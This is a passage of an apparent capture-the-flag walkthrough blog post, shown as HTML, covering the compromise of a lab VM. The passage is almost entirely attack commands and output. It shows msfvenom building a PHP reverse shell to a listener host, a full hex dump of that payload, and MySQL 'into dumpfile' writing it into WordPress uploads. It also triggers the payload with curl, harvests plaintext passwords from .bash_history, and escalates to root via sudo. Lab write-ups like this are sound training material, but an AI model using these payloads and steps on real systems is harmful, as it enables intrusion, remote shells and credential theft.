+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_perl <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-o</span> back.door.php
+</code></pre></div></div>
+
+<p>We hex encode the php reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>xxd <span class="nt">-ps</span> back.door.php | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="p">;</span> <span class="nb">echo
+</span>2f2a3c3f706870202f2a2a2f0a202020202020406572726f725f7265706f7274696e672830293b0a202020202020407365745f74696d655f6c696d69742830293b204069676e6f72655f757365725f61626f72742831293b2040696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b0a202020202020246f6367785a566d3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b0a20202020202069662821656d70747928246f6367785a566d29297b0a2020202020202020246f6367785a566d3d707265675f7265706c61636528272f5b2c205d2b2f272c20272c272c20246f6367785a566d293b0a2020202020202020246f6367785a566d3d6578706c6f646528272c272c20246f6367785a566d293b0a2020202020202020246f6367785a566d3d61727261795f6d617028277472696d272c20246f6367785a566d293b0a2020202020207d656c73657b0a2020202020202020246f6367785a566d3d617272617928293b0a2020202020207d0a2020202020202463203d206261736536345f6465636f64652827634756796243417454556c504943316c4943636b6344316d62334a724f325634615851736157596f4a4841704f79526a5057356c6479424a547a6f365532396a613256304f6a704a546b56554b46426c5a584a425a4752794c4349784f5449754d5459344c6a45334f5334784f6a51304d7949704f314e5552456c4f4c54356d5a4739775a57346f4a474d7363696b374a483474506d5a6b6233426c6269676b597978334b54747a65584e305a57306b5879423361476c735a54772b4f79633d27293b0a2020202020206966202846414c534520213d3d20737472706f7328737472746f6c6f776572285048505f4f53292c202777696e27202929207b0a202020202020202024633d24632e2220323e26315c6e223b0a2020202020207d0a202020202020244f447a633d2769735f63616c6c61626c65273b0a20202020202024426a4f44683d27696e5f6172726179273b0a2020202020200a202020202020696628244f447a632827706f70656e2729616e642124426a4f44682827706f70656e272c246f6367785a566d29297b0a20202020202020202466703d706f70656e2824632c277227293b0a202020202020202024656676614f623d4e554c4c3b0a202020202020202069662869735f7265736f757263652824667029297b0a202020202020202020207768696c65282166656f662824667029297b0a20202020202020202020202024656676614f622e3d6672656164282466702c31303234293b0a202020202020202020207d0a20202020202020207d0a20202020202020204070636c6f736528246670293b0a2020202020207d656c73650a202020202020696628244f447a63282770617373746872752729616e642124426a4f446828277061737374687275272c246f6367785a566d29297b0a20202020202020206f625f737461727428293b0a20202020202020207061737374687275282463293b0a202020202020202024656676614f623d6f625f6765745f636f6e74656e747328293b0a20202020202020206f625f656e645f636c65616e28293b0a2020202020207d656c73650a202020202020696628244f447a632827657865632729616e642124426a4f4468282765786563272c246f6367785a566d29297b0a202020202020202024656676614f623d617272617928293b0a2020202020202020657865632824632c24656676614f62293b0a202020202020202024656676614f623d6a6f696e28636872283130292c24656676614f62292e636872283130293b0a2020202020207d656c73650a202020202020696628244f447a63282773797374656d2729616e642124426a4f4468282773797374656d272c246f6367785a566d29297b0a20202020202020206f625f737461727428293b0a202020202020202073797374656d282463293b0a202020202020202024656676614f623d6f625f6765745f636f6e74656e747328293b0a20202020202020206f625f656e645f636c65616e28293b0a2020202020207d656c73650a202020202020696628244f447a6328277368656c6c5f657865632729616e642124426a4f446828277368656c6c5f65786563272c246f6367785a566d29297b0a202020202020202024656676614f623d7368656c6c5f65786563282463293b0a2020202020207d656c73650a202020202020696628244f447a63282770726f635f6f70656e2729616e642124426a4f4468282770726f635f6f70656e272c246f6367785a566d29297b0a20202020202020202468616e646c653d70726f635f6f70656e2824632c6172726179286172726179282770697065272c277227292c6172726179282770697065272c277727292c6172726179282770697065272c27772729292c247069706573293b0a202020202020202024656676614f623d4e554c4c3b0a20202020202020207768696c65282166656f66282470697065735b315d29297b0a2020202020202020202024656676614f622e3d6672656164282470697065735b315d2c31303234293b0a20202020202020207d0a20202020202020204070726f635f636c6f7365282468616e646c65293b0a2020202020207d656c73650a2020202020207b0a202020202020202024656676614f623d303b0a2020202020207d0a20202020
+</code></pre></div></div>
+
+<p>We access the wordpress database.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>mysql <span class="nt">-h</span> 192.168.179.171 <span class="nt">-u</span> root <span class="nt">-D</span> wordpress <span class="nt">-p</span>
+Enter password: 
+Reading table information <span class="k">for </span>completion of table and column names
+You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
+
+Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MySQL connection <span class="nb">id </span>is 7
+Server version: 5.7.12-0ubuntu1 <span class="o">(</span>Ubuntu<span class="o">)</span>
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+MySQL <span class="o">[</span>wordpress]&gt;
+</code></pre></div></div>
+
+<p>Then we write the php reverse shell on the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MySQL <span class="o">[</span>wordpress]&gt; <span class="k">select </span>0x2f2a3c3f706870202f2a2a2f0a202020202020406572726f725f7265706f7274696e672830293b0a202020202020407365745f74696d655f6c696d69742830293b204069676e6f72655f757365725f61626f72742831293b2040696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b0a202020202020246f6367785a566d3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b0a20202020202069662821656d70747928246f6367785a566d29297b0a2020202020202020246f6367785a566d3d707265675f7265706c61636528272f5b2c205d2b2f272c20272c272c20246f6367785a566d293b0a2020202020202020246f6367785a566d3d6578706c6f646528272c272c20246f6367785a566d293b0a2020202020202020246f6367785a566d3d61727261795f6d617028277472696d272c20246f6367785a566d293b0a2020202020207d656c73657b0a2020202020202020246f6367785a566d3d617272617928293b0a2020202020207d0a2020202020202463203d206261736536345f6465636f64652827634756796243417454556c504943316c4943636b6344316d62334a724f325634615851736157596f4a4841704f79526a5057356c6479424a547a6f365532396a613256304f6a704a546b56554b46426c5a584a425a4752794c4349784f5449754d5459344c6a45334f5334784f6a51304d7949704f314e5552456c4f4c54356d5a4739775a57346f4a474d7363696b374a483474506d5a6b6233426c6269676b597978334b54747a65584e305a57306b5879423361476c735a54772b4f79633d27293b0a2020202020206966202846414c534520213d3d20737472706f7328737472746f6c6f776572285048505f4f53292c202777696e27202929207b0a202020202020202024633d24632e2220323e26315c6e223b0a2020202020207d0a202020202020244f447a633d2769735f63616c6c61626c65273b0a20202020202024426a4f44683d27696e5f6172726179273b0a2020202020200a202020202020696628244f447a632827706f70656e2729616e642124426a4f44682827706f70656e272c246f6367785a566d29297b0a20202020202020202466703d706f70656e2824632c277227293b0a202020202020202024656676614f623d4e554c4c3b0a202020202020202069662869735f7265736f757263652824667029297b0a202020202020202020207768696c65282166656f662824667029297b0a20202020202020202020202024656676614f622e3d6672656164282466702c31303234293b0a202020202020202020207d0a20202020202020207d0a20202020202020204070636c6f736528246670293b0a2020202020207d656c73650a202020202020696628244f447a63282770617373746872752729616e642124426a4f446828277061737374687275272c246f6367785a566d29297b0a20202020202020206f625f737461727428293b0a20202020202020207061737374687275282463293b0a202020202020202024656676614f623d6f625f6765745f636f6e74656e747328293b0a20202020202020206f625f656e645f636c65616e28293b0a2020202020207d656c73650a202020202020696628244f447a632827657865632729616e642124426a4f4468282765786563272c246f6367785a566d29297b0a202020202020202024656676614f623d617272617928293b0a2020202020202020657865632824632c24656676614f62293b0a202020202020202024656676614f623d6a6f696e28636872283130292c24656676614f62292e636872283130293b0a2020202020207d656c73650a202020202020696628244f447a63282773797374656d2729616e642124426a4f4468282773797374656d272c246f6367785a566d29297b0a20202020202020206f625f737461727428293b0a202020202020202073797374656d282463293b0a202020202020202024656676614f623d6f625f6765745f636f6e74656e747328293b0a20202020202020206f625f656e645f636c65616e28293b0a2020202020207d656c73650a202020202020696628244f447a6328277368656c6c5f657865632729616e642124426a4f446828277368656c6c5f65786563272c246f6367785a566d29297b0a202020202020202024656676614f623d7368656c6c5f65786563282463293b0a2020202020207d656c73650a202020202020696628244f447a63282770726f635f6f70656e2729616e642124426a4f4468282770726f635f6f70656e272c246f6367785a566d29297b0a20202020202020202468616e646c653d70726f635f6f70656e2824632c6172726179286172726179282770697065272c277227292c6172726179282770697065272c277727292c6172726179282770697065272c27772729292c247069706573293b0a202020202020202024656676614f623d4e554c4c3b0a20202020202020207768696c65282166656f66282470697065735b315d29297b0a2020202020202020202024656676614f622e3d6672656164282470697065735b315d2c31303234293b0a20202020202020207d0a20202020202020204070726f635f636c6f7365282468616e646c65293b0a2020202020207d656c73650a2020202020207b0a202020202020202024656676614f623d303b0a2020202020207d0a20202020 into dumpfile <span class="s1">'/var/www/https/blogblog/wp-content/uploads/shell.php'</span><span class="p">;</span>
+Query OK, 1 row affected <span class="o">(</span>0.009 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We start a netcat listener on port 443 and run the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-k</span> <span class="s1">'https://192.168.179.171:12380/blogblog/wp-content/uploads/shell.php'</span>
+</code></pre></div></div>
+
+<p>We got a low privilege shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                            
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.171] 49282
+python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
+www-data@red:/var/www/https/blogblog/wp-content/uploads<span class="err">$</span>
+</code></pre></div></div>
+
+<p>While listing the users <strong>.bash_history</strong> file I found the password of user JKanode and peter.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/var/www/https/blogblog/wp-content/uploads<span class="nv">$ </span><span class="nb">cd</span> /home
+www-data@red:/home<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'.bash_history'</span> <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span>
+...
+sshpass <span class="nt">-p</span> thisimypassword ssh JKanode@localhost
+apt-get <span class="nb">install </span>sshpass
+sshpass <span class="nt">-p</span> JZQuyIN5 peter@localhost
+...
+</code></pre></div></div>
+
+<p>I switched to the user peter, after providing the password a message is presented, to skip it simply press enter or add !/bin/bash</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@red:/home<span class="nv">$ </span>su peter                                                                                                                                        
+su peter                                                                                                                                                            
+Password: JZQuyIN5                                                                                                                                                  
+                                                                                                                                                                    
+This is the Z Shell configuration <span class="k">function for </span>new <span class="nb">users</span>,                                                                                                           
+zsh-newuser-install.                                                                                                                                                
+You are seeing this message because you have no zsh startup files                                                                                                   
+<span class="o">(</span>the files .zshenv, .zprofile, .zshrc, .zlogin <span class="k">in </span>the directory                                                                                                     
+~<span class="o">)</span><span class="nb">.</span>  This <span class="k">function </span>can <span class="nb">help </span>you with a few settings that should                                                                                                     
+make your use of the shell easier.                                                                                                                                  
+                                                                                                                                                                    
+You can:                                                                                                                                                            
+                                                                                                                                                                    
+<span class="o">(</span>q<span class="o">)</span>  Quit and <span class="k">do </span>nothing.  The <span class="k">function </span>will be run again next time.                                                                                                
+                                                                                                                                                                    
+<span class="o">(</span>0<span class="o">)</span>  Exit, creating the file ~/.zshrc containing just a comment.                                                                                                    
+     That will prevent this <span class="k">function </span>being run again.
+
+<span class="o">(</span>1<span class="o">)</span>  Continue to the main menu.
+
+<span class="o">(</span>2<span class="o">)</span>  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and <span class="nb">exit</span> <span class="o">(</span>you will need to edit
+     the file by hand, <span class="k">if </span>so desired<span class="o">)</span><span class="nb">.</span>
+
+<span class="nt">---</span> Type one of the keys <span class="k">in </span>parentheses <span class="nt">---</span> <span class="o">!</span>/bin/bash
+<span class="o">!</span>/bin/bash^J
+Aborting.
+The <span class="k">function </span>will be run again next time.  To prevent this, execute:
+  <span class="nb">touch</span> ~/.zshrc
+red% /bin/bash                                                                  
+peter@red:/home<span class="err">$</span>
+</code></pre></div></div>
+
+<p>As we can see the user peter is allowed to run any command as sudo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@red:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                                            
+<span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                                                             
+                                                                                                                                                                    
+We trust you have received the usual lecture from the <span class="nb">local </span>System                                                                                                  
+Administrator. It usually boils down to these three things:                                                                                                         
+                                                                                                                                                                    
+    <span class="c">#1) Respect the privacy of others.                                                                                                                              </span>
+    <span class="c">#2) Think before you type.</span>
+    <span class="c">#3) With great power comes great responsibility.</span>
+
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>peter: JZQuyIN5
+
+Matching Defaults entries <span class="k">for </span>peter on red:
+    <span class="nv">lecture</span><span class="o">=</span>always, env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User peter may run the following commands on red:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>We run the following command and we get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@red:/home<span class="nv">$ </span><span class="nb">sudo </span>su -
+<span class="nb">sudo </span>su -
+➜  ~ <span class="nb">ls                                                                        
+ls
+</span>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
+➜  ~ <span class="nb">cat </span>flag.txt                                                              
+<span class="nb">cat </span>flag.txt
+~~~~~~~~~~&lt;<span class="o">(</span>Congratulations<span class="o">)&gt;</span>~~~~~~~~~~
+                          .-<span class="s1">'''''-.
+                          |'</span><span class="nt">-----</span><span class="s1">'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'</span><span class="nt">-----</span><span class="s1">'`
+ '</span><span class="nt">--------</span><span class="s1">'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+</span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
